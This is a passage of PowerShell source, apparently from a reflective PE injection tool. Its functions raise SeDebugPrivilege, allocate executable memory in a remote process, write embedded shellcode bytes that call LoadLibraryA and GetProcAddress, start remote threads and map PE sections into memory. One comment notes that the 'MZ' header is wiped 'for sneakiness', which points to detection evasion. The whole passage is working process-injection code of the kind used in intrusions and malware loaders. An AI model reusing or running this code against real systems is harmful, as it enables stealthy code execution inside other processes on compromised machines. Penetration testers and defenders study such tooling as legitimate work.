            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw "Unable to impersonate self"
                }

                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }

        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($Result -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
            #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }

    Function Create-RemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,

        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,

        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )

        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero

        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            #Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            #Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }

        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
        }

        return $RemoteThreadHandle
    }

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        $NtHeadersInfo = New-Object System.Object

        #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        #Get IMAGE_NT_HEADERS
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)

        #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }

        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }

        return $NtHeadersInfo
    }


    #This function will get the information needed to allocated space in memory for the PE
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        $PEInfo = New-Object System.Object

        #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null

        #Get NtHeadersInfo
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types

        #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)

        #Free the memory allocated above, this isn't where we allocate the PE to memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)

        return $PEInfo
    }


    #PEInfo must contain the following NoteProperties:
    #   PEHandle: An IntPtr to the address the PE is loaded to in memory
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }

        $PEInfo = New-Object System.Object

        #Get NtHeaders information
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types

        #Build the PEInfo object
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)

        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }

        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }

        return $PEInfo
    }

    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)

        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }

        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes

        [IntPtr]$DllAddress = [IntPtr]::Zero
        #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
        #   Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
        if ($PEInfo.PE64Bit -eq $true)
        {
            #Allocate memory for the address returned by LoadLibraryA
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }

            #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)

            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem

            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }

            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }

            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }

            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }

        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        return $DllAddress
    }

    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,

        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        $FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
            $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

            #Write FunctionName to memory (will be used in GetProcAddress)
            $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($RFuncNamePtr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process"
            }

            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write DLL path to remote process memory"
            }
            if ($FunctionNameSize -ne $NumBytesWritten)
            {
                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }

        #Get address of GetProcAddress
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        #Allocate memory for the address returned by GetProcAddress
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }

        #Write Shellcode to the remote process which will call GetProcAddress
        #Shellcode: GetProcAddress.asm
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem

        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)

        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "Unable to write shellcode to remote process memory."
        }

        $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }

        #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }

        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)

            #Address to copy the section to
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))

            #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
            #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
            #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
            #    so truncate SizeOfRawData to VirtualSize
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }

            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }

            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }

            #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        [Int64]$BaseDifference = 0
        $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)

        #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }

        #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
